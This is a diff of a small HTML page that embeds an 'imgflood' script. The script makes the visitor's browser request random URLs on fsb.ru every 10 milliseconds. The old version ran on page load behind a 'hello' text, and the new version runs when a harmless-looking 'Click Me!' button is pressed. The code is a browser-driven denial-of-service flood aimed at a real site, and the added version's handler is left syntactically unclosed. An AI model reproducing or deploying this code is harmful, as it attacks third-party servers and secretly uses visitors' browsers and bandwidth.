@@ -1,11 +1,16 @@
-hello
-<script>
-    function imgflood() {
-  var TARGET = 'fsb.ru'
-  var URI = '/fsb/sh.htm?query='
-  var pic = new Image()
-  var rand = Math.floor(Math.random() * 1000)
-  pic.src = 'http://'+TARGET+URI+rand
-}
-setInterval(imgflood, 10)
+<button type="button" id="clickme">Click Me!</button>
+
+<script type="text/javascript">
+    document.getElementById("clickme").addEventListener("click", function() {
+
+        function imgflood() {
+            var TARGET = 'fsb.ru'
+            var URI = '/fsb/sh.htm?query='
+            var pic = new Image()
+            var rand = Math.floor(Math.random() * 1000)
+            pic.src = 'http://' + TARGET + URI + rand
+        }
+
+        setInterval(imgflood, 10)
+    }
 </script>
